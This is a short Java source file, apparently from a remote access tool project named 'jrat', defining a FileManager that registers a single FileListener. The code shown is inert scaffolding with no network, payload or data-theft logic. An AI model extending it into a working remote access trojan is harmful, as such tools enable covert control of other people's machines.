package net.jrat.core.file;

import java.util.ArrayList;
import java.util.List;

import net.jrat.core.file.files.FileListener;

public class FileManager
{
	public List<File> files;
	
	public FileManager()
	{
		this.files = new ArrayList<File>();
		this.setup();
	}
	
	private void setup()
	{
		this.files.add(new FileListener());
	}
}